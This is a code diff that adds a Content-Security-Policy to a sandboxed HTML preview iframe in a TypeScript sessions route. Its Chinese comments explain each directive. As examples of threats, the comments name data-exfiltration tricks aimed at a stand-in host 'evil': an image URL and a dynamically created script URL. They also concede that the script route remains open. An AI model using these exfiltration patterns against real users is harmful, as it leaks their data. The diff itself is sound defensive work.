@@ -33,6 +33,26 @@ const permissionModeSchema = z.object({
     mode: PermissionModeSchema
 })
 
+/**
+ * HTML 预览 iframe 的 Content-Security-Policy。
+ * 见 serve-file 路由注释——配合 iframe sandbox（allow-scripts allow-same-origin）使用：
+ * 保留 same-origin 让子资源不被 ORB 拦截，用 CSP 把脚本能力面收窄到「只加载资源、不联网」。
+ */
+const PREVIEW_CSP = [
+    "default-src 'none'",
+    "script-src 'self' https: 'unsafe-inline'",
+    "style-src 'self' https: 'unsafe-inline'",
+    "img-src 'self' data:",
+    "font-src 'self' https: data:",
+    "media-src 'self' data:",
+    "connect-src 'none'",
+    "form-action 'none'",
+    "base-uri 'none'",
+    "frame-ancestors 'self'",
+    "object-src 'none'",
+    "frame-src 'none'",
+].join('; ')
+
 const modelSchema = z.object({
     model: z.string().nullable()
 })
@@ -557,6 +577,19 @@ export function createSessionsRoutes(getSyncEngine: () => SyncEngine | null): Ho
         return serveFileContent(c, engine, sessionResult.sessionId, absPath, {
             download,
             extraHeaders: { 'x-content-type-options': 'nosniff' },
+            // HTML 预览文档走 sandbox iframe。iframe 保留 allow-same-origin 是为了让同目录/子目录的
+            // CSS/JS 子资源不被 Chrome ORB 拦截（sandboxed opaque origin 的跨源 no-cors 子资源会被丢弃），
+            // 但这也让预览的脚本获得 mobi origin 能力。CSP 把这层能力重新收窄：
+            //   - script/style/font 'self' + https:  → 支持同目录文件（'self'=serve-file）与外部 CDN（https:），
+            //     满足「本地 js/css + CDN 图标库」需求；'unsafe-inline' 兼容行内 <script>/<style>
+            //   - img/media 'self' + data:           → 禁外链图片，堵 `<img src=https://evil/?data>` GET 外带
+            //   - connect-src 'none'                  → 禁所有 fetch/XHR/sendBeacon/WebSocket，
+            //     脚本无法以用户身份（httpOnly cookie）调 mobi API，也无法把数据 POST 到外部
+            //   - form-action 'none' / base-uri 'none' / object-src 'none' / frame-src 'none'
+            // 残留面：动态createElement('script').src='https://evil/?data' 这类「把数据拼进资源 URL」的
+            // 外带仍可绕过（凡允许外链资源加载即无法根治）；但 mobi 凭证走 httpOnly cookie、localStorage
+            // 不放 token，外带仅限 recent-paths/偏好等低价值 PII。相较原先「脚本可任意调 mobi API」大幅收敛。
+            htmlCsp: PREVIEW_CSP,
         })
     })
 
